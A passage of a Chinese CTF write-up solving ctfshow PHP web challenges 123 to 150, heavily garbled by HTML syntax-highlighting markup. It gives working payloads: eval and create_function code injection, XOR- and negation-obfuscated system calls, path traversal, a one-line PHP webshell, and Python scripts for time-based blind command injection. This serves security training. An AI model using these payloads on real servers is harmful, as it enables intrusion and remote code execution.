class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>).<span class="hljs-string">&#x27;36&#x27;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$num</span>)!==<span class="hljs-string">&#x27;36&#x27;</span>&amp;&amp;<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-variable">$num</span>!==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;\n&quot;</span>;<br>  &#125;<br>  &#125;<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;<br>%0C36</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><br>### web123<br><br>- php特性：在php中变量是由数字和下划线组成的，所以不论用post还是<span class="hljs-keyword">get</span>传入变量参数的时候都将空格、+、点、[转换为下划线，但是使用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，例：CTF[SHOW.COM ===&gt; CTF_SHOW.COM<br><br>- ```<br>  POST:CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">1</span>&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=echo $flag</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><ul><li><pre><code class="hljs">POST:CTF_SHOW=6&amp;CTF[SHOW.COM=6&amp;fun=highlight_file($_GET[1])GET:1=flag.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web126</span><br><br>```php<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>先给payload</p></li><li><p>&#96;&#96;&#96;<br>GET:$fl0g&#x3D;flag_give_me<br>POST:CTF_SHOW&#x3D;6&amp;CTF[SHOW.COM&#x3D;6&amp;fun&#x3D;assert($a[0])</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>- 解释一下：<br><br>  - GET传参中传的是<span class="hljs-variable">$fl0g</span>不是fl0g所以可以绕过isset<br><br>  - assert断言函数，如果里面传字符串，会被当作PHP代码执行<br><br>  - ```<br>    <span class="hljs-variable">$a</span><span class="hljs-selector-attr">[0]</span>=$_SERVER<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;argv&#x27;</span>]</span><span class="hljs-selector-attr">[0]</span>=$_SERVER<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]</span>=&gt;<span class="hljs-variable">$fl0g</span>=flag_give_me<br></code></pre></td></tr></table></figure><ul><li><p>&#96;&#96;&#96;<br>$_SERVER[‘argv’]：</p><p>1、cli模式（命令行）下</p><pre><code class="hljs">第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数</code></pre><p>2、web网页模式下</p><pre><code class="hljs">在web页模式下必须在php.ini开启register_argc_argv配置项设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]$argv,$argc在web模式下不适用</code></pre><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web127<br><br>- ```<br>  /?ctf show=ilove36d<br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><ul><li>&#96;&#96;&#96;<br>call_user_func:把第一个参数当作回掉函数用<br>知识点：_()是一个函数<br>_()&#x3D;&#x3D;gettext()是gettext()的扩展函数，开启text扩展，需要php扩展目录下有php_gettext.dll<br>get_defined_vars():返回由所有已定义变量组成的数组<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><br>- ```<br>  /?<span class="hljs-built_in">f1</span><span class="hljs-symbol">=_</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=get_defined_vars</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-comment">### web130</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">数组绕过</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">```</span><br>  <span class="hljs-attribute">POST</span><span class="hljs-punctuation">:</span> <span class="hljs-string">f[]=666</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><ul><li><p>不知道为什么这次不能数组绕过了</p></li><li><p>回溯次数限制绕过</p></li><li><p>&#96;&#96;&#96;python<br>import requests<br>url&#x3D;”<a href="http://04e1d5d4-1233-40e9-aa80-51a9a75459ea.challenge.ctf.show/&quot;">http://04e1d5d4-1233-40e9-aa80-51a9a75459ea.challenge.ctf.show/&quot;</a><br>data&#x3D;{<br>‘f’:’very’*250000+’36Dctfshow’<br>}<br>r&#x3D;requests.post(url,data&#x3D;data)<br>print(r.text)</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web132<br><br>- 访问robots<br><br>- 访问admin<br><br>- ```<br>  /?username=admin&amp;password=<span class="hljs-number">1</span>&amp;<span class="hljs-keyword">code</span>=admin<br></code></pre></td></tr></table></figure></li></ul><h3 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h3><ul><li><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></li><li>长见识</li></ul><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><ul><li><p>&#96;&#96;&#96;<br>parse_str()–将字符串解析成多个变量；如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域</p><p>extract()–从数组中将变量导入到当前的符号表，将键名当作变量名，值作为变量的值（默认覆盖）</p><p>注意两个的区别：</p><p>extract是将数组中元素分解,执行后数组的key值作为变量名，数组的value赋值给对应Key的变量，这样可以直接通过Key变量去访问，不用数组加key去访问。</p><p>即：从数组中创建变量</p><p>parse_str是根据”&#x3D;”来分解字符串，主要用于对url参数的解析。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```<br>  /?_POST[key1]=<span class="hljs-number">36</span>d&amp;_POST[key2]=<span class="hljs-number">36</span>d<br></code></pre></td></tr></table></figure></li></ul><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?F&#x3D;<code>$F</code> ;cp flag.php 666.txt<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">### web136</span><br><br>- ```<br>  ?c=<span class="hljs-built_in">ls</span> \|<span class="hljs-built_in">tee</span> 1<br>  //将根目录下的内容写入1<br>  访问1，下载文件发现f149_15_h3r3<br>  ?c=<span class="hljs-built_in">nl</span> /f149_15_h3r3|<span class="hljs-built_in">tee</span> 1<br>  访问1，下载文件得flag<br></code></pre></td></tr></table></figure></li></ul><h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><ul><li>&#96;&#96;&#96;<br>POST:ctfshow&#x3D;ctfshow::getFlag<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web138<br><br>- ```<br>  POST:ctfshow[<span class="hljs-number">0</span>]=ctfshow&amp;ctfshow[<span class="hljs-number">1</span>]=getFlag<br></code></pre></td></tr></table></figure></li></ul><h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><ul><li><p>获取文件名脚本</p></li><li><p>&#96;&#96;&#96;python<br>import requests<br>import time<br>import string<br>str&#x3D;string.ascii_letters+string.digits#生成所有字母与数字[a-zA-Z0-9]<br>result&#x3D;””<br>for i in range(1,5):<br>key&#x3D;0<br>for j in range(1,15):<br>    if key&#x3D;&#x3D;1:<br>        break<br>    for n in str:<br>        payload&#x3D;”if [ <code>ls /|awk &#39;NR==&#123;0&#125;&#39;|cut -c &#123;1&#125;</code> &#x3D;&#x3D; {2} ];then sleep 3;fi”.format(i,j,n)<br>        #print(payload)<br>        url&#x3D;”<a href="http://9147392b-f7b0-40d9-b327-bcf91149507e.challenge.ctf.show/?c=&quot;+payload">http://9147392b-f7b0-40d9-b327-bcf91149507e.challenge.ctf.show/?c=&quot;+payload</a><br>        try:<br>            requests.get(url,timeout&#x3D;(2.5,2.5))<br>        except:<br>            result&#x3D;result+n<br>            print(result)<br>            break<br>        if n&#x3D;&#x3D;’9’:<br>            key&#x3D;1<br>result+&#x3D;” “</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>- 读取文件内容脚本<br><br>- ```python<br>  import requests<br>  import time<br>  import string<br>  <span class="hljs-attribute">str</span>=string.digits+string.ascii_lowercase+&quot;-&quot;#获取小写字母与数字<br>  <span class="hljs-attribute">result</span>=<span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-attribute">key</span>=0<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,45):<br>  <span class="hljs-built_in">print</span>(j)<br>  <span class="hljs-keyword">if</span> <span class="hljs-attribute">key</span>==1:<br>  break<br>  <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> str:<br>  <span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.format(j,n)<br>  #<span class="hljs-built_in">print</span>(payload)<br>  <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://9147392b-f7b0-40d9-b327-bcf91149507e.challenge.ctf.show/?c=&quot;</span>+payload<br>  try:<br>  requests.<span class="hljs-built_in">get</span>(url,timeout=(2.5,2.5))#time()第一个参数是响应时间，第二个是读取时间<br>  except:<br>      <span class="hljs-attribute">result</span>=result+n<br>      <span class="hljs-built_in">print</span>(result)<br>      break<br></code></pre></td></tr></table></figure></li></ul><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f1</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br>    <span class="hljs-variable">$f2</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f1</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f2</span>))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$f1</span>(<span class="hljs-subst">$f2</span>());&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$code</span>) == <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>题目分析：要求我们输入f1和f2必须是小写字母和数字的组成</p></li><li><p>&#96;&#96;&#96;<br>0和字符串进行弱比较的时候返回的就是true，因为比较时会先将字符串类型转化成相同，再比较，<br>所以只要intval（$code）为0<br>所以code是字符串就行</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><br>- ```<br>  POST：<span class="hljs-built_in">f1</span><span class="hljs-symbol">=md5</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=md5</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><ul><li><pre><code class="hljs">正则匹配：\w :匹配字母数字下划线\W :非字母数字下划线<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>- ```<br>  绕过return的方式：<br>  php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 <span class="hljs-number">1</span><span class="hljs-built_in">-phpinfo</span>();结合减号是可以执行<span class="hljs-built_in">phpinfo</span>()命令的。（不一定是减号，还有加、乘、除号，若用加号。要用+，要进行URL编码，这是个特殊字符，不进行编码会当作空格）<br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;<br>system(tac f*);<br>经过取反处理<br>(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5);<br>payload：<br>?v1&#x3D;1&amp;v3&#x3D;-(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5);-&amp;v2&#x3D;1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- ```php<br>  <span class="hljs-comment"># 取反脚本</span><br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>); <span class="hljs-variable">$i</span>++) &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;%&quot;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>])^<span class="hljs-number">0xff</span>);<br>  &#125;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;^&quot;</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>); <span class="hljs-variable">$i</span>++) &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;%ff&quot;</span>;<br>  &#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><ul><li>&#96;&#96;&#96;<br>&#x2F;?v1&#x3D;0<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>### web<span class="hljs-number">143</span><br><br>- 类似web<span class="hljs-number">141</span><br><br>- ```<br>  ?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span>*(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%86</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%92</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)(<span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%df</span><span class="hljs-variable">%99</span><span class="hljs-variable">%d5</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)*<br></code></pre></td></tr></table></figure></li></ul><h3 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h3><ul><li><p>这道题对v3进行check，要求v3的长度为1，但没有对v2进行check，所以把命令赋值给v2</p></li><li><p>&#96;&#96;&#96;<br>?v1&#x3D;1&amp;v3&#x3D;1&amp;v2&#x3D;-(“%0c%06%0c%0b%05%0d”^”%7f%7f%7f%7f%60%60”)(“%0b%01%03%00%06%00”^”%7f%60%60%20%60%2a”)</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>### web<span class="hljs-number">145</span><br><br>- ```<br>  ?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span>|(~<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%86</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%df</span><span class="hljs-variable">%99</span><span class="hljs-variable">%d5</span>)|&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h3><ul><li><pre><code class="hljs">?v1=1&amp;v2=1&amp;v3=|(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)|<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web147</span><br><br>- ```php<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]))&#123;<br>      <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>      <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="hljs-variable">$ctfshow</span>)) &#123;<br>          <span class="hljs-variable">$ctfshow</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>分析正则表达式：<br>&#x2F;i不区分大小写<br>&#x2F;s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[\f\n\r\t\v]<br>&#x2F;D如果使用$限制结尾字符,则不允许结尾有换行</p></li><li><p>正则的意思是：不能出现以下划线、数字、大小写字母开头并结尾的字符串。很明显，就是要想办法在函数名的头或者尾找一个字符，不影响函数调用。</p></li><li><p>所以使用create_function()代码注入，利用\绕过</p></li><li><p>&#96;&#96;&#96;<br>为什么使用\绕过？<br>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径即在当前的空间内调用； 而如果是\function_name()这样的形式去调用函数，则是表示写了一个绝对路径即去\这个空间调用。 如果你在其他namespace里调用系统类，必须使用绝对路径的写法</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><br>- ```<br>  get: show=<span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;&#125;system(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-comment">//</span><br>  post: ctf=\create_function<br>   <br>  结果就是：<br>  $ctfshow(<span class="hljs-string">&#x27;&#x27;</span>,$_GET[<span class="hljs-string">&#x27;show&#x27;</span>]);<br>  =&gt;<br>   <br>  \creat_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;echo 123;&#125;system(&#x27;</span>tac f*<span class="hljs-string">&#x27;);//&#x27;</span>);<br>  =&gt;<br>   <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;&#125;system(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-comment">//;&#125;</span><br>   <br>  =&gt;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;<br>  &#125;<br>  system(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-comment">//;&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><ul><li><p>没有过滤^直接异或构造</p></li><li><p>&#96;&#96;&#96;<br>?code&#x3D;(“%08%02%08%09%05%0d”^”%7b%7b%7b%7d%60%60”)(“%09%01%03%01%06%02”^”%7d%60%60%21%60%28”);</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web149</span><br><br>- unlink 删除文件<br><br>- 直接写index里面一句话木马<br><br>- ```<br>  GET:?ctf=index.php<br>  POST:show=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br>  然后访问url/index.php;POST传参<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac /ctfshow_fl0g_here.txt&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h3 id="web150和150-plus"><a href="#web150和150-plus" class="headerlink" title="web150和150_plus"></a>web150和150_plus</h3><ul><li><p>Session文件包含</p></li><li><p>&#96;&#96;&#96;python</p></li></ul><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 